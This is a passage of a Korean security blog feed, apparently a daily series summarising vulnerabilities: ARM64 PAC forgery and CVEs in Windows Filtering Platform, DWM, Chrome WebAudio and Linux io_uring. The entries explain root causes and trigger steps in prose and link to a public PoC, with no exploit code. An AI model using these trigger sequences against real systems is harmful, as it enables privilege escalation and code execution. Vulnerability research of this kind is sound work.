&#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC77C;&#xB2E8; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB294; &#xB2F9;&#xC5F0;&#xD788; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. context&#xB294; 64&#xBE44;&#xD2B8; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. <code>paciasp</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; PAC&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xACBD;&#xC6B0;, &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.(<code>paciasp</code>&#xC758; &#xB9E8;&#xB4A4;&#xAC00; sp&#xC778; &#xC774;&#xC720;)</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774; &#xC138; &#xAC1C;&#xC758; &#xAC12;&#xC740; &#xD2B9;&#xC815; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xB418;&#xC5B4; PAC&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <a href="https://eprint.iacr.org/2016/444.pdf">QARMA</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; CPU &#xC81C;&#xC870;&#xC0AC;&#xB9C8;&#xB2E4; &#xCEE4;&#xC2A4;&#xD140;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; <code>PAC</code>&#xB294; sign&#xD558;&#xB824;&#xACE0; &#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xC0C1;&#xC704; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Sign&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xBA3C;&#xC800; aut&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xBCC0;&#xC870;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB611;&#xAC19;&#xC774; &#xD3EC;&#xC778;&#xD130; &#xAC12;&#xACFC; context &#xADF8;&#xB9AC;&#xACE0; key &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC815;&#xC0C1;&#xC778;&#xC9C0;&#xB97C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; userspace&#xC5D0;&#xC11C;&#xB294; <code>PAC</code>&#xC0DD;&#xC131; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; key&#xC640; context&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>PAC</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xC5B4;&#xC57C;&#xB9CC; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xBD80;&#xD569;&#xD558;&#xB294; &#xAC12;&#xC744; &#xC5BB;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>PAC Forgery</code>&#xB294; key&#xC640; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC5C6;&#xC774; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xBE14;&#xB85C;&#xADF8;&#xC758; &#xC608;&#xC2DC; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD1B5;&#xD574; <code>LR</code>&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB294; ASLR&#xC774; &#xAC78;&#xB824;&#xC788;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; PAC &#xC0DD;&#xC131;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; <code>sign_contract()</code>&#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; <code>pacia</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xB300;&#xD55C; PAC&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; <code>pacia</code> &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; context&#xB97C; &#xC54C;&#xACE0; &#xC788;&#xB2E4;&#xBA74; &#xC6D0;&#xD558;&#xB294; <code>PAC</code> &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xB7F0; &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC810;&#xD504;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; <code>PAC</code> &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>LR</code>&#xC5D0; &#xB123;&#xC73C;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;&#xD558;&#xC5EC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB9CC;, &#xD574;&#xB2F9; &#xC608;&#xC2DC; &#xBB38;&#xC81C;&#xB294; <code>pacia</code>&#xB97C; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xC774;&#xACE0; <code>ASLR</code>&#xC774; &#xC548; &#xAC78;&#xB824; &#xC788;&#xC5B4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xAE30; &#xB9E4;&#xC6B0; &#xC26C;&#xC6B4; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>information leak</code> &#xCDE8;&#xC57D;&#xC810;&#xACFC; pac &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC5B4;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB450;&#xAC1C;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4;&#xC57C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB798;&#xC11C; &#xC5B4;&#xB824;&#xC6B4;&#xAC74;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694;. &#xC5B8;&#xC820;&#xAC00;&#xB294; &#xC81C;&#xAC00; &#xC9C1;&#xC811; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC774;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xB294; &#xAE00;&#xC744; &#xC368;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>j0ker</tag>
      
      <tag>arm64</tag>
      
      <tag>pac</tag>
      
      <tag>pointer authentication</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
    <link href="/2021/06/26/fabu1ous/2021-06-26/"/>
    <url>/2021/06/26/fabu1ous/2021-06-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)&#xC758; TCP/IP &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; token impersonation level&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC29;&#xD654;&#xBCBD; &#xC815;&#xCC45; &#xC6B0;&#xD68C; &#xBC0F; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>WFP&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD55C; API &#xBC0F; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;. &#xC18C;&#xCEA3;&#xC5D0; &#xC791;&#xC5C5;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74; &#xAE30;&#xBCF8; &#xD544;&#xD130;&#xB9C1; &#xC5D4;&#xC9C4; &#xBC0F; Windows &#xBC29;&#xD654;&#xBCBD;&#xC5D0;&#xC11C; &#xAD6C;&#xC131;&#xD55C; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C; &#xC791;&#xC5C5;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294;&#xB370; &#xADF8; &#xD544;&#xD130;&#xB9C1; &#xC815;&#xCC45;&#xC740; &#xD638;&#xCD9C;&#xC790;&#xC758; &#xD1A0;&#xD070; &#xC0C1;&#xD0DC;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xC815;&#xCC45;&#xB4E4;&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xB85C; &#xC778;&#xD574; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>PsReferenceImpersonationToken&#xC744; &#xD638;&#xCD9C;&#xD574; &#xD1A0;&#xD070;&#xC744; TOKEN_ACCESS_INFORMATION &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xB54C; impersonation level&#xC774; SecurityImpersonation &#xC774;&#xC0C1;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>TCP/IP &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD1A0;&#xD070; impersonating &#xB3C4;&#xC911;&#xC5D0; &#xC18C;&#xCEA3; &#xC0DD;&#xC131;&#xC744; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC2DC;&#xC2A4;&#xD15C; &#xD1A0;&#xD070;&#xC744; &#xCEA1;&#xCC98;&#xD558;&#xACE0; impersonat &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xBBC0;&#xB85C; &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xBC29;&#xD654;&#xBCBD; &#xC815;&#xCC45;&#xC5D0; &#xC758;&#xD574; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xD5C8;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>tcpip</tag>
      
      <tag>wfp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
    <link href="/2021/06/25/l0ch/2021-06-25/"/>
    <url>/2021/06/25/l0ch/2021-06-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/&#xB370;&#xC2A4;&#xD06C;&#xD1B1;_&#xCC3D;_&#xAD00;&#xB9AC;&#xC790;">Windows &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xCC3D; &#xAD00;&#xB9AC;&#xC790;</a>(Desktop Window Manager, dwm.exe)&#xC758; <code>dwmcore.dll</code> &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; UAF&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>dwmcore.dll</code> &#xBAA8;&#xB4C8;&#xC758; <code>CinteractionTrackerBindingManager</code> &#xAC1D;&#xCCB4;&#xB294; &#xCC38;&#xC870; &#xD69F;&#xC218;(reference count)&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC2DC;&#xC810;&#xC774; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xAC1D;&#xCCB4;&#xB97C; &#xBC14;&#xC778;&#xB529;&#xD558;&#xB294; &#xACBD;&#xC6B0;<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xCC38;&#xC870; &#xD69F;&#xC218;&#xAC00; 1 &#xC99D;&#xAC00;&#xD558;&#xBA70;, &#xBC14;&#xC778;&#xB529; &#xD574;&#xC81C;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xCC38;&#xC870; &#xD69F;&#xC218;&#xAC00; 1 &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;. &#xCC38;&#xC870; &#xD69F;&#xC218;&#xAC00; 0&#xC774; &#xB41C; &#xAC1D;&#xCCB4;&#xB294; <code>CMILCOMBase::InternalRelease</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAC19;&#xC740; &#xAC1D;&#xCCB4;&#xB97C; &#xBC14;&#xC778;&#xB529;&#xD558;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; <code>CinteractionTrackerBindingManager</code> &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD588;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xD574;&#xCEE4;&#xAC00; DirectComposition API&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCF54;&#xB4DC; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xB3D9;&#xC77C;&#xD55C; <code>CinteractionTrackerMarshaler</code>&#xB97C; &#xBC14;&#xC778;&#xB529;&#xD558;&#xB294; &#xB450; &#xAC1C;&#xC758; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; <code>CinteractionTrackerBindingManager</code>&#xC744; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> &#xD568;&#xC218;&#xB294; &#xB3D9;&#xC77C;&#xD55C; <code>CinteractionTrackerMarshaler</code>&#xC5D0; &#xB300;&#xD574; &#xD55C; &#xBC88;&#xB9CC; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xCC38;&#xC870; &#xD69F;&#xC218;&#xB294; 1 &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB9AC;&#xC18C;&#xC2A4;&#xC758; &#xC0AC;&#xC6A9;&#xC774; &#xC885;&#xB8CC;&#xB418;&#xACE0; &#xD574;&#xC81C;&#xB420; &#xB54C; <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> &#xD568;&#xC218;&#xB294; &#xAC01;&#xAC01;&#xC758; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><p>&#xCCAB; &#xD638;&#xCD9C; &#xC2DC; <code>CinteractionTrackerBindingManager</code> &#xAC1D;&#xCCB4;&#xC758; &#xCC38;&#xC870; &#xD69F;&#xC218;&#xAC00; 1 &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;. 0&#xC774; &#xB41C; &#xACBD;&#xC6B0; <code>CMILCOMBase::InternalRelease</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C; &#xC2DC; &#xD574;&#xC81C;&#xB41C; <code>CinteractionTrackerBindingManager</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p></li></ul></li></ol><p>&#xACF5;&#xAC1C;&#xB41C; PoC&#xB294; <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;  <code>dwmcore.dll</code> &#xC5D0;&#xC11C;&#xB294; &#xC9C0;&#xB09C; 4&#xC6D4; <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write &#xCDE8;&#xC57D;&#xC810;(CVE-2021-28310)</a>&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>uaf</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
    <link href="/2021/06/24/idioth/2021-06-24/"/>
    <url>/2021/06/24/idioth/2021-06-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/06/chrome-web-audio.html">Vulnerability Spotlight: Code execution vulnerability in Google Web Audio API</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google Chrome 88.0.4324.146 (Official version) (64-bit)</li><li>Google Chrome 90.0.4405.0 (Build) (64-bit)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome&#xC758; WebAudio <code>blink::AudioNodeOutput::Pull</code>&#xC5D0;&#xC11C; use after-free&#xB97C; &#xD1B5;&#xD55C; code execution &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xC791;&#xB41C; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>blink::AudioNodeOutput::Pull</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xBBF8; &#xCD08;&#xAE30;&#xD654; &#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC778; <code>in_place_bus</code> (AudioBus &#xD3EC;&#xC778;&#xD130;)&#xB97C; &#xC81C;&#xACF5;&#xBC1B;&#xC544; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. WebAudio <code>createGain()</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74; AudioNode &#xAC1D;&#xCCB4; &#xB4F1;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xCD9C;&#xB825;&#xC5D0; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. AudioNode &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC758; <code>connect()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB178;&#xB4DC;&#xC758; &#xCD9C;&#xB825; &#xC911; &#xD558;&#xB098;&#xB97C; &#xD0C0;&#xAE43;&#xC5D0;&#xAC8C; &#xC5F0;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;. &#xB8E8;&#xD504;&#xC5D0;&#xC11C; <code>new Float32Array/Uint8Array</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC778;&#xC811;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC5F0;&#xC18D;&#xD574;&#xC11C; &#xD560;&#xB2F9;&#xD558;&#xBA70; &#xC774;&#xB85C; &#xC778;&#xD574; garbage collector&#xAC00; &#xAC15;&#xC81C;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. garbage collection&#xC774; &#xC218;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; audio rendering thread&#xB294; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB41C; AudioNode (AudioOutput)&#xC744; &#xCC38;&#xC870;&#xD558;&#xBBC0;&#xB85C; use after-free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; <code>blink::AudioNodeOutput::Pull</code>&#xC740; &#xC774; AudioNode &#xAC1D;&#xCCB4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
      <tag>webaduio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-20226: 리눅스 커널의 UAF 취약점</title>
    <link href="/2021/06/23/fabu1ous/2021-06-23/"/>
    <url>/2021/06/23/fabu1ous/2021-06-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021&#x2013;20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel &#xBE44;&#xB3D9;&#xAE30; I/O &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC778; io_uring&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Use-after-free &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. File structure&#xB97C; worker &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; reference &#xCE74;&#xC6B4;&#xD130;&#xB97C; &#xB298;&#xB9AC;&#xC9C0; &#xC54A;&#xACE0; file descriptor table&#xC744; &#xACF5;&#xC720;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>Worker &#xC2A4;&#xB808;&#xB4DC;&#xB294; file_struct &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; reference&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xD568;&#xC218; <code>fdget()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>fdget()</code>&#xB294; file_struct&#xC5D0; &#xB300;&#xD55C; reference counter&#xAC00; 1&#xC77C; &#xB54C; &#xC774;&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; <code>fdget()</code>&#xC5D0; &#xC758;&#xD574; &#xC5BB;&#xC740; &#xD30C;&#xC77C;&#xC740; &#xC774;&#xBBF8; &#xB2EB;&#xD788;&#xACE0; &#xD574;&#xC81C;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xC218;&#xB3C4; 